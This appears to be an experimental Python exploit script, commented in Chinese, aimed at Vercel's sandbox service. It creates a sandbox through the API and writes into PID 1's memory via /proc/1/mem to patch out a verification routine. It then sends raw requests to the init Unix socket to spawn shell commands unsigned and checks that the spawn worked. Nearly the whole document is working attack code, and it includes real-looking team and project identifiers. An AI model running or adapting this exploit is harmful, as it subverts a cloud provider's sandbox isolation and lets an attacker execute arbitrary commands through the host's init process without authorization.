# -*- coding: utf-8 -*-
"""实验J274: patch 后免签 Spawn (connect+json streaming)
A: patch verify 入口
B: Spawn connect+json -> r3.txt (期望 200 + SpawnEvent 流)
C: Spawn 的进程是否可见 (ps), 执行结果 marker
"""
import json, time, urllib.request, urllib.error, sys
try:
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')
except Exception:
    pass

TOKEN = "vcp_REDACTED_PLACEHOLDER"
TEAM = "team_GIy1SZ444lspqeNbh4r8uAUg"
PROJ = "prj_iyw2xfjP3RKPT7n8b8c1tBIxxK5F"

def api(method, path, body=None, timeout=300):
    req = urllib.request.Request(f"https://api.vercel.com{path}", method=method)
    req.add_header("Authorization", f"Bearer {TOKEN}")
    req.add_header("Content-Type", "application/json")
    data = json.dumps(body).encode() if body is not None else None
    try:
        with urllib.request.urlopen(req, data=data, timeout=timeout) as r:
            return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()[:600]
    except Exception as e:
        return -1, f"EXC {type(e).__name__}: {e}"

def run_cmd(sid, code, label, wait=True, timeout=280):
    body = {"command": "python3", "args": ["-c", code],
            "wait": wait, "logs": True, "timeout": timeout}
    t0 = time.time()
    for attempt in range(4):
        c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}", body)
        if c == 200:
            break
        print(f"  retry[{attempt}] status {c}: {r[:150]}", flush=True)
        if c == 410 or "sandbox_stopped" in r:
            print(f"  SANDBOX_DEAD at cmd[{label}]", flush=True)
            return "DEAD"
        time.sleep(3)
    dt = time.time() - t0
    print(f"=== cmd[{label}] status {c} wall={dt:.1f}s ===", flush=True)
    out = ""
    if c != 200:
        print(f"  RAW: {r[:400]}", flush=True)
        return "DEAD" if "sandbox_stopped" in r else ""
    for line in r.splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            d = json.loads(line)
            if d.get("stream") in ("stdout", "stderr"):
                out += d.get("data", "")
            elif d.get("stream") == "command":
                print("\nEXIT:", d.get("command", {}).get("exitCode"), flush=True)
        except Exception:
            print(line[:400], flush=True)
    if out:
        print(out, flush=True)
    return out

BG_SPAWN = r'''
import socket, sys, time

def spawn_req(command, args, outfile, timeout=15):
    try:
        sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect("/run/vercel/share/init.sock")
        import json as _j
        body = _j.dumps({"command": command, "args": args, "env": {}}).encode()
        req = (
            b"POST /vercel.sandbox.spawn.v1.SpawnService/Spawn HTTP/1.1\r\n"
            b"Host: init\r\n"
            b"Content-Type: application/connect+json\r\n"
            b"Connect-Protocol-Version: 1\r\n"
            b"Content-Length: " + str(len(body)).encode() + b"\r\n"
            b"Connection: close\r\n\r\n" + body
        )
        sock.sendall(req)
        data = b""
        note = ""
        try:
            while True:
                d = sock.recv(4096)
                if not d:
                    break
                data += d
                if len(data) > 60000:
                    break
        except socket.timeout:
            note = "TIMEOUT"
        except Exception as e:
            note = "ERR %s: %s" % (type(e).__name__, e)
        sock.close()
        open(outfile, "wb").write(data + b"\n==NOTE== " + note.encode())
        return len(data)
    except Exception as e:
        open(outfile, "wb").write(("EXC %s: %s" % (type(e).__name__, e)).encode())
        return -1

cmd = sys.argv[1]
args = sys.argv[2].split("\x1f") if sys.argv[2] else []
outf = sys.argv[3]
spawn_req(cmd, args, outf)
'''

NAME = "expj274"
api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
c, r = api("POST", f"/v2/sandboxes?teamId={TEAM}",
           {"projectId": PROJ, "name": NAME})
print("create:", c, flush=True)
if c != 200:
    print(r[:400], flush=True)
    sys.exit(1)
sid = json.loads(r)["sandbox"]["currentSessionId"]
print("sid:", sid, flush=True)

# A: patch
CODE_A = r'''
import os
fd = os.open("/proc/1/mem", os.O_RDWR)
def ra(a, n):
    os.lseek(fd, a, 0)
    return os.read(fd, n)
def wa(a, b):
    os.lseek(fd, a, 0)
    return os.write(fd, b)
old = ra(0x77ba00, 5)
print("OLD", old.hex(), flush=True)
if old == bytes.fromhex("4c8d6424a8"):
    wa(0x77ba00, bytes.fromhex("31c031dbc3"))
    print("PATCHED", ra(0x77ba00, 5).hex(), flush=True)
else:
    print("PATTERN_DIFF", old.hex(), flush=True)
os.close(fd)
'''
rA = run_cmd(sid, CODE_A, "A_PATCH", timeout=100)
print("A PATCHED:", "PATCHED" in (rA or ""), flush=True)

if "PATCHED" in (rA or ""):
    # B: Spawn "id" 免签
    CODE_B = r'''
import subprocess
open("/tmp/bgs.py", "w").write(%r)
def bg(cmd, args, outf, log):
    r = subprocess.Popen(
        ["setsid", "nohup", "python3", "/tmp/bgs.py", cmd, args, outf],
        stdout=open(log, "w"), stderr=subprocess.STDOUT,
        stdin=subprocess.DEVNULL, close_fds=True,
    )
    return r.pid
pid = bg("/bin/sh", "-c\x1fid; echo SPWN_MARK > /tmp/spawn_marker.txt", "/tmp/r3.txt", "/tmp/bg3.log")
print("bg3 pid", pid, flush=True)
''' % BG_SPAWN
    run_cmd(sid, CODE_B, "B_BG3", timeout=100)
    time.sleep(9)
    CODE_C = r'''
import os
print("r3 exists:", os.path.exists("/tmp/r3.txt"), flush=True)
if os.path.exists("/tmp/r3.txt"):
    d = open("/tmp/r3.txt", "rb").read()
    print("r3 len", len(d), flush=True)
    print("r3:", "".join(chr(b) if 32 <= b < 127 else "." for b in d)[:1200], flush=True)
print("spawn_marker:", os.path.exists("/tmp/spawn_marker.txt"), flush=True)
if os.path.exists("/tmp/spawn_marker.txt"):
    print("marker:", open("/tmp/spawn_marker.txt").read()[:200], flush=True)
'''
    run_cmd(sid, CODE_C, "C_CHECK3", timeout=100)

    # D: 后台 Spawn sleep 60 进程 + 观察 (Spawn 的进程能力)
    CODE_D = r'''
import subprocess
def bg(cmd, args, outf, log):
    r = subprocess.Popen(
        ["setsid", "nohup", "python3", "/tmp/bgs.py", cmd, args, outf],
        stdout=open(log, "w"), stderr=subprocess.STDOUT,
        stdin=subprocess.DEVNULL, close_fds=True,
    )
    return r.pid
pid = bg("/bin/sh", "-c\x1fsleep 60 & echo $! > /tmp/spawned_pid.txt", "/tmp/r4.txt", "/tmp/bg4.log")
print("bg4 pid", pid, flush=True)
'''
    run_cmd(sid, CODE_D, "D_BG4", timeout=100)
    time.sleep(6)
    CODE_E = r'''
import os, subprocess
print("spawned_pid:", open("/tmp/spawned_pid.txt").read().strip() if os.path.exists("/tmp/spawned_pid.txt") else "N/A", flush=True)
r = subprocess.run("ps -eo pid,ppid,uid,stat,cmd | grep -v grep", shell=True, capture_output=True, timeout=8)
print((r.stdout or b"").decode("latin1", "replace"), flush=True)
'''
    run_cmd(sid, CODE_E, "E_PS", timeout=100)

api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
print("\ncleanup done", flush=True)
